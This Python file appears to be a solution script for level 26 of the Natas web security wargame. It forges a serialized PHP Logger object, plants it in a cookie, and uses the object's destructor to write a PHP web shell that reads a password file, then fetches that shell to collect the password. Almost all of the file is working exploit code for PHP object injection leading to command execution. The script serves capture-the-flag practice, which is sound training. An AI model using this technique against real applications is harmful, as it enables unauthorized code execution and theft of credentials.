import re
from src.natas.base_level import NatasLevel
import phpserialize
import base64

class Level_26(NatasLevel):

  num = 26
  explanation = "On this level, the app unserializes a cookie-controlled object. We forge a fake Logger\n     object and set it as the `drawing` cookie, so its `__destruct` writes our PHP payload\n     (stored in `exitMsg`) into `logFile` inside img/, which we then request directly to leak the password."

  def exploit(self) -> str:

    def private_prop(_class, _name):
      return f"\x00{_class}\x00{_name}"
    CLASS     = "Logger"
    PROPS     = {
        private_prop(CLASS, "logFile"): "/var/www/natas/natas26/img/pwned2.php",
        private_prop(CLASS, "initMsg"): "",
        private_prop(CLASS, "exitMsg"): '<?php echo shell_exec("cat /etc/natas_webpass/natas27"); ?>',
    }
    body = "".join(
      f's:{len(k.encode())}:"{k}";s:{len(v.encode())}:"{v}";'
      for k, v in PROPS.items()
    )
    serialized = f'O:{len(CLASS)}:"{CLASS}":{len(PROPS)}:{{{body}}}'
    PAYLOAD    = base64.b64encode(serialized.encode()).decode()
    self.session.cookies.set("drawing", PAYLOAD)
    self.session.get(self.base_url + "/index.php")
    resp       = self.session.get(self.base_url + "/img/pwned2.php")
    matches    = re.findall(r'[a-zA-Z0-9]{32}', resp.text)
    match      = matches[-1]

    return match
